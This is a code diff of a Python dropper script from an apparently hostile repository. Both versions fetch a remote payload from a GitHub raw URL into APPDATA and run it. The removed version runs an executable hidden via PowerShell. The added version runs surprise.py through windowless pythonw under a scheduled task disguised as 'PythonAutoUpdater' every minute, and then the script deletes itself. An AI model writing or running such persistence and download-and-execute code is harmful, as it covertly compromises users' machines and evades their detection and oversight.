@@ -1,39 +1,49 @@
 import os
 import subprocess
-import time
 import sys
+import time
+import shutil
 
-# Direct download link for the executable
-executable_url = "https://raw.githubusercontent.com/davidkennedy02/gaslight/main/dist/hmm.exe"
+# Scheduled Task Name
+task_name = "PythonAutoUpdater"
 
-# Step 1: Define the PowerShell command to download and execute the payload
-powershell_command = f'''
-$URL = "{executable_url}";
-$Output = "$env:APPDATA\\hmm.exe";
-Invoke-WebRequest -Uri $URL -OutFile $Output;
-Start-Process -FilePath "$Output" -WindowStyle Hidden;
+# Direct GitHub raw link to the Python script
+python_script_url = "https://raw.githubusercontent.com/davidkennedy02/gaslight/refs/heads/main/surprise.py"
+
+# Path to store the downloaded script
+script_path = os.path.join(os.environ["APPDATA"], "surprise.py")
+
+# Locate pythonw.exe (default location or from PATH)
+python_executable = shutil.which("pythonw")  # Checks if pythonw.exe is in PATH
+if not python_executable:
+    # Manually set a likely Python path if not found
+    python_executable = os.path.expandvars(r"%LOCALAPPDATA%\Programs\Python\Python310\pythonw.exe")
+
+# Step 1: PowerShell Script to Download and Execute surprise.py
+powershell_script = f'''
+$ScriptPath = "{script_path}"
+Invoke-WebRequest -Uri "{python_script_url}" -OutFile $ScriptPath
 '''
 
-# Step 2: Save the PowerShell command to a temporary file in the user's AppData folder
-temp_ps_path = os.path.join(os.environ["APPDATA"], "inject.ps1")
-with open(temp_ps_path, "w") as ps_file:
-    ps_file.write(powershell_command)
+# Run PowerShell script to download the Python script
+subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", powershell_script], check=True)
 
-# Step 3: Create a scheduled task that runs the PowerShell script every 3 minutes under the current user
-task_name = "somethingreallyunique"
-create_task_command = f"""
-schtasks /create /tn "{task_name}" /tr "powershell.exe -ExecutionPolicy Bypass -File {temp_ps_path}" /sc minute /mo 3 /f
-"""
+# Step 2: Create the Scheduled Task to Run Python Directly
+if os.path.exists(script_path):
+    pass
+else:
+    print("Something went wrong...")
 
-# Execute the scheduled task creation command
-subprocess.run(create_task_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+# Corrected schtasks command to run Python directly
+create_task_command = f'''
+schtasks /create /tn "{task_name}" /tr "{python_executable} {script_path}" /sc minute /mo 1 /f
+'''
 
-# Step 4: Clean up by deleting the PowerShell script
-if os.path.exists(temp_ps_path):
-    os.remove(temp_ps_path)
+# Execute the Scheduled Task Creation Command
+os.system(create_task_command)
 
-# Step 5: Self-delete with a delay
+# Step 3: Self-Delete Setup Script
 current_script_path = os.path.realpath(__file__)
-time.sleep(2)  # Prevent locked file errors
+time.sleep(2)
 subprocess.Popen(f'cmd.exe /c del "{current_script_path}"', shell=True)
 sys.exit()
